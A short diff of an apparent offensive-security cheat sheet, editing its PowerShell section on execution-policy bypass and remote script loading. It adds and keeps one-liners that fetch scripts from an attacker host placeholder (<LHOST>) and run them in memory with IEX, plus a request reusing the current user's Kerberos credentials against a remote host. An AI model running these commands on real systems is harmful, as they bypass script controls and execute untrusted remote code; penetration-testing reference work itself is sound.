@@ -4204,14 +4204,22 @@ PS C:\> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
 
 ```c
 PS C:\> powershell -ex bypass -File <FILE>.ps1
-PS C:\> powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
+PS C:\> powershell -noprofile -executionpolicy bypass -file .\<FILE>.ps1
 ```
 
 ### Invoke-Expression / Invoke-WebRequest
 
 ```c
+PS C:\> iwr <LHOST>/<FILE>.ps1 -o <FILE>.ps1
+PS C:\> iwr http://<LHOST>/<FILE>.ps1 -o <FILE>.ps1
 PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1)
 PS C:\> Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
+```
+
+#### Use Kerberos Tickets
+
+```c
+PS C:\> iwr -UseDefaultCredentials http://<RHOST>
 ```
 
 ### .NET Reflection
